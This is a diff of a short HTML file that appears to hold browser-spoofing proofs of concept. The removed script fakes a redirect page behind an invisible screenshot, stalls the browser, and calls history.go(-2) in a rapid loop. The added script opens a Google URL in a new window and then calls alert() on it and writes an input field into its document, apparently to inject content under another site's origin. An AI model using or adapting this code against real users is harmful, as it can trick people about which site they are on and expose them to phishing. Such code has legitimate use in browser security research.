@@ -1,43 +1,27 @@
 
- <script>
-    //// MDN calculatePrimes slowdown code
-    function calculatePrimes(iterations, multiplier) {
-        var primes = [];
-        for (var i = 0; i < iterations; i++) {
-            var candidate = i * (multiplier * Math.random());
-            var isPrime = true;
-            for (var c = 2; c <= Math.sqrt(candidate); ++c) {
-                if (candidate % c === 0) {
-                    // not prime
-                    isPrime = false;
-                    break;
-                }
-            }
-            if (isPrime) {
-                primes.push(candidate);
-            }
-        }
-        return primes;
-    }
+<!DOCTYPE html>
+<html>
+<body>
 
+<h1>The Window Object</h1>
+<h2>The open() Method</h2>
 
-    function main() {
-     location.reload()
-        calculatePrimes(1000, 100000)
-        window.queueMicrotask(spoof)
-    }
+<p>Click the button to open a new browser window.</p>
 
-    function spoof() {
-        document.getElementById("image").src = null
-
-        setInterval(function () {
-            window.history.go(-2)
-        }, 9)
-    }
-</script>
-Please wait while we redirecting you...
-<img id="image" src="screenshot.jpg" style="font-family: 'Roboto'; opacity: 0%">
+<button onclick="myFunction()">Try it</button>
 
 <script>
-    main()
+function myFunction() {
+ var x = window.open("https://www.google.com/csi");
+
+   setTimeout(function(){x.alert()}, 1850)
+
+
+   setTimeout(function(){x.document.write(`
+        <input />
+    `);}, 2400)
+}
 </script>
+
+</body>
+</html>
